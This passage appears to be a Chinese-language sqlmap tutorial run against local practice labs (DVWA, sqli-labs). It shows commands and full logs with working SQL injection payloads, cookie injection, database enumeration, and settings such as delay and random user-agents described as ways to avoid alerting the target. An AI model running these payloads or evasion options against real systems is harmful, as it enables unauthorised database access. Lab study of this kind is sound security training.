[18:06:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[18:06:03] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[18:06:03] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[18:06:03] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:06:14] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[18:06:14] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[18:06:14] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[18:06:14] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[18:06:14] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[18:06:14] [INFO] target URL appears to have 2 columns in query
[18:06:14] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[18:06:14] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]

sqlmap identified the following injection point(s) with a total of 145 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=1' OR NOT 4485=4485#&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 4021 FROM(SELECT COUNT(*),CONCAT(0x7170767871,(SELECT (ELT(4021=4021,1))),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- itaf&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 5269 FROM (SELECT(SLEEP(5)))UGkv)-- hSLn&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=1' UNION ALL SELECT CONCAT(0x7170767871,0x77445a5271767a68534a6a4f506b6d7846796151674d745a704549484b614856506754536d726242,0x716a7a6a71),NULL#&Submit=Submit
---
[18:06:28] [INFO] the back-end DBMS is MySQL
[18:06:28] [INFO] fetching banner
[18:06:28] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries)
[18:06:28] [INFO] retrieved: '5.7.26'
[18:06:29] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
back-end DBMS: MySQL >= 5.0
banner: '5.7.26'
[18:06:29] [INFO] fetching database names
[18:06:29] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
[18:06:29] [WARNING] the SQL query provided does not return any output
[18:06:29] [INFO] retrieved: 'information_schema'
[18:06:29] [INFO] retrieved: 'challenges'
[18:06:29] [INFO] retrieved: 'demo'
[18:06:29] [INFO] retrieved: 'demo1125'
[18:06:29] [INFO] retrieved: 'demo1204'
[18:06:29] [INFO] retrieved: 'dvwa'
[18:06:29] [INFO] retrieved: 'jingdong'
[18:06:29] [INFO] retrieved: 'mysql'
[18:06:29] [INFO] retrieved: 'performance_schema'
[18:06:29] [INFO] retrieved: 'pythontest'
[18:06:29] [INFO] retrieved: 'security'
[18:06:29] [INFO] retrieved: 'sys'
available databases [12]:
[*] challenges
[*] demo
[*] demo1125
[*] demo1204
[*] dvwa
[*] information_schema
[*] jingdong
[*] mysql
[*] performance_schema
[*] pythontest
[*] security
[*] sys

[18:06:29] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 18:06:29 /2020-02-26/

                                                                                                                                                                                                                                                                                                            
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119
```

获取当前数据库进行测试：

```shell
python sqlmap.py -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "security=low; csrftoken=gdhsRRG8COXmUmcoRBvbc259rYnbPKX FpEiggOHQF9MZxMkmBsX8zavVCyuWB7oF; PHPSESSID=e0c8pbo1jmiji6fjb5gl5e0nug" --banner --current-db
1
```

打印

```shell
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.2.31#dev}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:08:43 /2020-02-26/

Cookie parameter 'csrftoken' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N]

[18:08:45] [INFO] resuming back-end DBMS 'mysql'
[18:08:45] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=1' OR NOT 4485=4485#&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 4021 FROM(SELECT COUNT(*),CONCAT(0x7170767871,(SELECT (ELT(4021=4021,1))),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- itaf&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 5269 FROM (SELECT(SLEEP(5)))UGkv)-- hSLn&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=1' UNION ALL SELECT CONCAT(0x7170767871,0x77445a5271767a68534a6a4f506b6d7846796151674d745a704549484b614856506754536d726242,0x716a7a6a71),NULL#&Submit=Submit
---
[18:08:45] [INFO] the back-end DBMS is MySQL
[18:08:45] [INFO] fetching banner
[18:08:45] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries)
[18:08:45] [INFO] resumed: '5.7.26'
back-end DBMS: MySQL >= 5.0
banner: '5.7.26'
[18:08:45] [INFO] fetching current database
[18:08:45] [INFO] retrieved: 'dvwa'
current database: 'dvwa'
[18:08:45] [INFO] fetched data logged to text files under 'xxxx\output\127.0.0.1'

[*] ending @ 18:08:45 /2020-02-26/

                                                                                                                                                                                                                                                                                                   
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748
```

可以看出当前的数据库为dvwa。

#### 使用场景二：

想利用cookie值上的SQL注入漏洞。想要检测是否存在cookie注入。
sqlmap使用cookie过程：

- 登录或浏览页面
- 找到cookie
- 在sqlmap中使用–cookie cookie值

进行登录获取cookie演示如下：
![登录获取cookie](https://img-blog.csdnimg.cn/2020022712193553.gif#pic_center)
网页显示的cookie和开发者工具里的cookie值并不一样，显示的是response的cookie，开发者工具里显示的是request的cookie，测试时使用显示的cookie。
进行测试：

```shell
python sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-20/index.php" --cookie "uname=admin" -- level 2 --banner
1
```

打印

```shell
        ___                                                                                                                                               
       __H__                                                                                                                                              
 ___ ___[,]_____ ___ ___  {1.4.2.31#dev}                                                                                                                  
|_ -| . ["]     | .'| . |                                                                                                                                 
|___|_  ["]_|_|_|__,|  _|                                                                                                                                 
      |_|V...       |_|   http://sqlmap.org                                                                                                               
                                                                                                                                                          
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all appli
cable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program               
                                                                                                                                                          
[*] starting @ 18:41:24 /2020-02-26/                                                                                                                      
                                                                                                                                                          
[18:41:24] [INFO] testing connection to the target URL                                                                                                    
[18:41:24] [INFO] testing if the target URL content is stable                                                                                             
[18:41:24] [INFO] target URL content is stable                                                                                                            
[18:41:24] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1'). You are advised t
o rerun with '--forms'                                                                                                                                    
                                                                                                                                                          
[*] ending @ 18:41:24 /2020-02-26/                                                                                                                        
                                                                                                                                                          
                                                                                                                                                                                                                                                                                                                                                                                                                                        
123456789101112131415161718192021
```

说明：
必须指定level大于等于2时才会显示出cookie注入的信息；
响应头中有Set-Cookie参数时，sqlmap会自动加载Set-Cookie的值进行探测，要想不用这些值，需要加上参数 **–drop-set-cookie**。

## 三、sqlmap设置请求参数(下)

### 1.sqlmap中设置user-agent

默认情况下，sqlmap使用以下用户代理执行HTTP请求：

> sqlmap/1.0-dev-xxxx(http://sqlmap.org)

sqlmap指定user-agent，使用参数

> –user-agent = ‘指定的user-agent’

指定请求头：

```shell
python sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-20/index.php" --cookie "uname=admin" -- level 6 --banner --user-agent="Mozilla/5.0 (Windows NT 10. 0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"
1
```

打印

```shell
        ___                                                                                                                                               
       __H__                                                                                                                                              
 ___ ___[)]_____ ___ ___  {1.4.2.31#dev}                                                                                                                  
|_ -| . [']     | .'| . |                                                                                                                                 
|___|_  ["]_|_|_|__,|  _|                                                                                                                                 
      |_|V...       |_|   http://sqlmap.org                                                                                                               
                                                                                                                                                          
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all appli
cable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program               
                                                                                                                                                          
[*] starting @ 18:50:43 /2020-02-26/                                                                                                                      
                                                                                                                                                          
[18:50:43] [INFO] testing connection to the target URL                                                                                                    
[18:50:43] [INFO] testing if the target URL content is stable                                                                                             
[18:50:44] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic no
r injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'                                      
how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit]                                                                                          
                                                                                                                                                          
[18:50:45] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1'). You are advised t
o rerun with '--forms'                                                                                                                                    
                                                                                                                                                          
[*] ending @ 18:50:45 /2020-02-26/                                                                                                                        
                                                                                                                                                          
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
123456789101112131415161718192021222324
```

使用随机请求头：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-20/index.php --cookie "uname=admin" --level 2 --banner --random-agent -v 5 --banner
1
```

打印

```shell
        ___                                                                                                                                               
       __H__                                                                                                                                              
 ___ ___[.]_____ ___ ___  {1.4.2.31#dev}                                                                                                                  
|_ -| . [,]     | .'| . |                                                                                                                                 
|___|_  ["]_|_|_|__,|  _|                                                                                                                                 
      |_|V...       |_|   http://sqlmap.org                                                                                                               
                                                                                                                                                          
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all appli
cable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program               
                                                                                                                                                          
[*] starting @ 18:58:38 /2020-02-26/                                                                                                                      
                                                                                                                                                          
[18:58:38] [DEBUG] cleaning up configuration parameters                                                                                                   
[18:58:38] [DEBUG] setting the HTTP timeout                                                                                                               
[18:58:38] [DEBUG] setting the HTTP Cookie header                                                                                                         
[18:58:38] [DEBUG] setting the HTTP User-Agent header                                                                                                     
[18:58:38] [DEBUG] loading random HTTP User-Agent header(s) from file 'E:\SQLMAP\sqlmapproject-sqlmap-0605f14\data\txt\user-agents.txt'                   
[18:58:38] [INFO] fetched random HTTP User-Agent header value 'Opera/9.50 (Macintosh; Intel Mac OS X; U; en)' from file 'E:\SQLMAP\sqlmapproject-sqlmap-06
05f14\data\txt\user-agents.txt'                                                                                                                           
[18:58:38] [DEBUG] creating HTTP requests opener object                                                                                                   
[18:58:38] [INFO] resuming back-end DBMS 'mysql'                                                                                                          
[18:58:38] [INFO] testing connection to the target URL                                                                                                    
[18:58:38] [TRAFFIC OUT] HTTP request [#1]:                                                                                                               
GET /sqli-labs/Less-20/index.php HTTP/1.1                                                                                                                 
Cache-control: no-cache                                                                                                                                   
Cookie: uname=admin                                                                                                                                       
User-agent: Opera/9.50 (Macintosh; Intel Mac OS X; U; en)                                                                                                 
Host: 127.0.0.1                                                                                                                                           
Accept: */*                                                                                                                                               
Accept-encoding: gzip,deflate                                                                                                                             
Connection: close                                                                                                                                         
                                                                                                                                                          
[18:58:38] [DEBUG] declared web page charset 'utf-8'                                                                                                      
[18:58:38] [TRAFFIC IN] HTTP response [#1] (200 OK):                                                                                                      
Date: Wed, 26 Feb 2020 10:58:38 GMT                                                                                                                       
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a                                                                                             
X-Powered-By: PHP/7.3.4                                                                                                                                   
Connection: close                                                                                                                                         
Transfer-Encoding: chunked                                                                                                                                
Content-Type: text/html; charset=UTF-8                                                                                                                    
URI: http://127.0.0.1:80/sqli-labs/Less-20/index.php                                                                                                      
sqlmap resumed the following injection point(s) from stored session:                                                                                      
---                                                                                                                                                       
Parameter: uname (Cookie)                                                                                                                                 
    Type: boolean-based blind                                                                                                                             
    Title: AND boolean-based blind - WHERE or HAVING clause                                                                                               
    Payload: uname=admin' AND 1273=1273 AND 'VZnJ'='VZnJ                                                                                                  
    Vector: AND [INFERENCE]                                                                                                                               
                                                                                                                                                          
    Type: error-based                                                                                                                                     
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)                                                              
    Payload: uname=admin' AND (SELECT 9557 FROM(SELECT COUNT(*),CONCAT(0x71627a7071,(SELECT (ELT(9557=9557,1))),0x71717a7171,FLOOR(RAND(0)*2))x FROM INFOR
MATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'Wwka'='Wwka                                                                                                      
    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.
PLUGINS GROUP BY x)a)                                                                                                                                     
                                                                                                                                                          
    Type: time-based blind                                                                                                                                
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)                                                                                             
    Payload: uname=admin' AND (SELECT 7148 FROM (SELECT(SLEEP(5)))nwhA) AND 'Invp'='Invp                                                                  
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])                                             
                                                                                                                                                          
    Type: UNION query                                                                                                                                     
    Title: Generic UNION query (NULL) - 3 columns                                                                                                         
    Payload: uname=-2942' UNION ALL SELECT NULL,NULL,CONCAT(0x71627a7071,0x43464c794b4a465a5649744b6d764e59424342614873544d7759636a62516371494476496653436
2,0x71717a7171)-- -                                                                                                                                       
    Vector:  UNION ALL SELECT NULL,NULL,[QUERY]-- -                                                                                                       
---                                                                                                                                                       
[18:58:38] [INFO] the back-end DBMS is MySQL                                                                                                              
[18:58:38] [INFO] fetching banner                                                                                                                         
[18:58:38] [DEBUG] resuming configuration option 'string' ('Login')                                                                                       
[18:58:38] [DEBUG] performed 0 queries in 0.00 seconds                                                                                                    
back-end DBMS: MySQL >= 5.0                                                                                                                               
banner: '5.7.26'                                                                                                                                          
[18:58:38] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'                                         
                                                                                                                                                          
[*] ending @ 18:58:38 /2020-02-26/                                                                                                                        
                                                                                                                                                          
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778
```

再次进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-18/index.php --random-agent -v 5 --banner --level 3
1
```

显示：



<iframe id="frysI1Mf-1582798311135" src="https://player.youku.com/embed/XNDU2NDIzMDE3Mg==" allowfullscreen="true" data-mediaembed="youku" style="box-sizing: border-box; outline: 0px; margin: 0px; padding: 0px; font-weight: normal; font-family: &quot;Microsoft YaHei&quot;, &quot;SF Pro Display&quot;, Roboto, Noto, Arial, &quot;PingFang SC&quot;, sans-serif; overflow-wrap: break-word; display: block; width: 660px; height: 330px;"></iframe>





探测的内容明显增多。

### 2.sqlmap中设置代理

sqlmap中设置代理的参数：

- –proxy
  设置HTTP代理服务器位置 格式：**–proxy http(s): //ip[端口]**
- –proxy-cred
  设置HTTP代理服务器认证信息 格式：**–proxy-cred user:pwd**
- –proxy-file
  设置多条代理在文件中
- –ignore-proxy
  当希望通过忽略系统范围内的HTTP(S)代理服务器设置来针对本地网络的目标部

最常用的是第一个参数。
**–proxy**参数测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --proxy "http://123.30.238.60:3128" --banner
1
```

打印

```shell
       __H__
 ___ ___[,]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:23:06 /2020-02-26/

[19:23:07] [INFO] resuming back-end DBMS 'mysql'
[19:23:07] [INFO] testing connection to the target URL
[19:23:28] [CRITICAL] unable to connect to the target URL or proxy. sqlmap is going to retry the request(s)
[19:23:28] [WARNING] if the problem persists please check that the provided target URL is reachable. In case that it is, you can try to rerun with switch '--random-agent' and/or proxy switches ('--ignore-proxy', '--proxy',...)
[19:24:31] [CRITICAL] unable to connect to the target URL or proxy

[*] ending @ 19:24:31 /2020-02-26/


12345678910111213141516171819
```

显然代理IP未连接成功。

### 3.sqlmap中设置延迟

参数：
**--delay 0**
sqlmap探测过程中会发送大量探测Payload到目标，如果默认情况过快的发包速度会导致目标预警。 为了避免这样的情况发生,可以在探测设置sqlmap发包延迟。
默认情况下，不设置延迟。

进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --delay 10 --banner
1
```

打印

```shell
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.2.31#dev}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:32:51 /2020-02-26/

[19:32:52] [INFO] resuming back-end DBMS 'mysql'
[19:32:52] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=2' AND 7360=7360 AND 'lcZO'='lcZO

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=2' AND (SELECT 4240 FROM(SELECT COUNT(*),CONCAT(0x716a787171,(SELECT (ELT(4240=4240,1))),0x7176627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'DARZ'='DARZ

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=2' AND (SELECT 9537 FROM (SELECT(SLEEP(5)))eRXY) AND 'MqRr'='MqRr

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-1033' UNION ALL SELECT NULL,NULL,CONCAT(0x716a787171,0x454766684a4352517a444b547a68524a6f744f4e6f7770796e6446515668715a516c424948495449,0x7176627071)-- -
---
[19:33:02] [INFO] the back-end DBMS is MySQL
[19:33:02] [INFO] fetching banner
back-end DBMS: MySQL >= 5.0
banner: '5.7.26'
[19:33:02] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 19:33:02 /2020-02-26/


1234567891011121314151617181920212223242526272829303132333435363738394041
```

显然，从19:32:52到19:33:02刚好是10秒，即设置的延迟的时间。

### 4.sqlmap中设置超时

参数：
**--timeout 30**

在考虑超时HTTP请求之前，可以指定等待的秒数，有效值是一个浮点数，比如10.5秒。
默认是30秒。

进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --timeout 3.5 --banner
1
```

打印

```shell
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:38:20 /2020-02-26/

[19:38:20] [INFO] testing connection to the target URL
[19:38:20] [INFO] checking if the target is protected by some kind of WAF/IPS
[19:38:20] [INFO] testing if the target URL content is stable
[19:38:21] [INFO] target URL content is stable
[19:38:21] [INFO] testing if GET parameter 'id' is dynamic
[19:38:21] [INFO] GET parameter 'id' appears to be dynamic
[19:38:21] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[19:38:21] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[19:38:21] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]

[19:38:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:38:27] [WARNING] reflective value(s) found and filtering out
[19:38:27] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Your")
[19:38:27] [INFO] testing 'Generic inline queries'
[19:38:27] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[19:38:27] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[19:38:27] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[19:38:27] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[19:38:27] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[19:38:27] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[19:38:27] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[19:38:27] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[19:38:27] [INFO] testing 'MySQL inline queries'
[19:38:27] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[19:38:27] [WARNING] time-based comparison requires larger statistical model, please wait....... (done)
[19:38:28] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[19:38:28] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[19:38:28] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[19:38:28] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[19:38:28] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[19:38:28] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[19:38:32] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[19:38:39] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)' injectable
[19:38:39] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[19:38:39] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[19:38:39] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[19:38:39] [INFO] target URL appears to have 3 columns in query
[19:38:40] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]

sqlmap identified the following injection point(s) with a total of 52 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 3414=3414 AND 'ixAz'='ixAz

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 3869 FROM(SELECT COUNT(*),CONCAT(0x7171717171,(SELECT (ELT(3869=3869,1))),0x717a717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'yUCf'='yUCf

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP)
    Payload: id=1' OR (SELECT 9421 FROM (SELECT(SLEEP(5)))QJil) AND 'yspB'='yspB

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-9639' UNION ALL SELECT NULL,NULL,CONCAT(0x7171717171,0x4b5469547561534947737449585a676d4767636475516b6c7a79726c687a54535149694e4f6e7962,0x717a717871)-- -
---
[19:38:43] [INFO] the back-end DBMS is MySQL
[19:38:43] [INFO] fetching banner
[19:38:43] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
back-end DBMS: MySQL >= 5.0
banner: '5.7.26'
[19:38:43] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 19:38:43 /2020-02-26/


12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182
```

### 5.sqlmap中设置超时重试次数

参数：
**--retries 3**

设置对应重试次数。
默认情况下重试3次。

关闭apache和mysql服务后进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --timeout 3.5 --retries 5 --banner
1
```

打印

```shell
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:56:59 /2020-02-26/

[19:57:00] [INFO] testing connection to the target URL
[19:57:02] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[19:57:02] [WARNING] if the problem persists please check that the provided target URL is reachable. In case that it is, you can try to rerun with switch '--random-agent' and/or proxy switches ('--ignore-proxy', '--proxy',...)
[19:57:12] [CRITICAL] unable to connect to the target URL
[19:57:12] [INFO] testing if the target URL content is stable
[19:57:14] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[19:57:24] [CRITICAL] unable to connect to the target URL
[19:57:24] [ERROR] there was an error checking the stability of page because of lack of content. Please check the page request results (and probable errors) by using higher verbosity levels
[19:57:24] [INFO] testing if GET parameter 'id' is dynamic
[19:57:26] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
there seems to be a continuous problem with connection to the target. Are you sure that you want to continue? [y/N]

[19:58:07] [ERROR] user quit

[*] ending @ 19:58:07 /2020-02-26/


12345678910111213141516171819202122232425262728
```

显然，进行了5次尝试.

### 6.sqlmap中设置随机参数

参数：
**--randomize 参数名称**

sqlmap可以指定要在每次请求期间随机更改其值的参数名称，长度和类型要和提供的原始值保持一致。

进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --randomize id --banner -v 5
1
```

打印

```shell
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.2.31#dev}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:08:08 /2020-02-26/

[20:08:08] [DEBUG] cleaning up configuration parameters
[20:08:08] [DEBUG] setting the HTTP timeout
[20:08:08] [DEBUG] setting the HTTP User-Agent header
[20:08:08] [DEBUG] creating HTTP requests opener object
[20:08:09] [INFO] resuming back-end DBMS 'mysql'
[20:08:09] [INFO] testing connection to the target URL
[20:08:09] [TRAFFIC OUT] HTTP request [#1]:
GET /sqli-labs/Less-1/?id=7 HTTP/1.1
Cache-control: no-cache
User-agent: sqlmap/1.4.2.31#dev (http://sqlmap.org)
Host: 127.0.0.1
Accept: */*
Accept-encoding: gzip,deflate
Connection: close

[20:08:09] [DEBUG] declared web page charset 'utf-8'
[20:08:09] [TRAFFIC IN] HTTP response [#1] (200 OK):
Date: Wed, 26 Feb 2020 12:08:09 GMT
